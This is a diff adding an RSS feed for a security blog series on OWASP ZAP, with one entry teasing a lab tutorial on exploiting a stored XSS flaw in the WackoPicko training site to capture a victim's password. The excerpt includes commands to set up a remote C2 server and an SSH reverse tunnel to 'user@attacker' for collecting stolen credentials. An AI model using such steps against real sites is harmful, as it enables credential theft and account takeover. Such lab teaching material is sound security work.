@@ -1,0 +1,22 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>OWASP ZAP on Chaotic Solutions</title>
+    <link>http://kurobeats.github.io/series/owasp-zap/</link>
+    <description>Recent content in OWASP ZAP on Chaotic Solutions</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <copyright>Anthony Cozamanis (CC BY 4.0)</copyright>
+    <lastBuildDate>Sat, 13 May 2023 00:00:00 +0000</lastBuildDate><atom:link href="http://kurobeats.github.io/series/owasp-zap/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Exploiting Cross-Site Scripting to Capture Passwords With OWASP ZAP</title>
+      <link>http://kurobeats.github.io/posts/exploiting-cross-site-scripting-to-capture-passwords-with-owasp-zap/</link>
+      <pubDate>Sat, 13 May 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://kurobeats.github.io/posts/exploiting-cross-site-scripting-to-capture-passwords-with-owasp-zap/</guid>
+      <description>WackoPicko is a website that includes common vulnerabilities, including a stored XSS vulnerability in its blog comment feature. This vulnerability can be exploited to retrieve a victim&amp;rsquo;s username and password and subsequently gain access to their account by utilising OWASP ZAP.
+Access your remote C2 server via SSH and modify /etc/ssh/sshd_config so the following are enabled: AllowTcpForwarding yes GatewayPorts yes Restart sshd with systemd: sudo systemctl restart ssh From your attacking machine, create a tunnel via SSH from the remote server so that anything that hits port 38193 will be redirected to the attacker&amp;rsquo;s instance of ZAP ssh -N -R 38193:localhost:38193 user@attacker.</description>
+    </item>
+    
+  </channel>
+</rss>
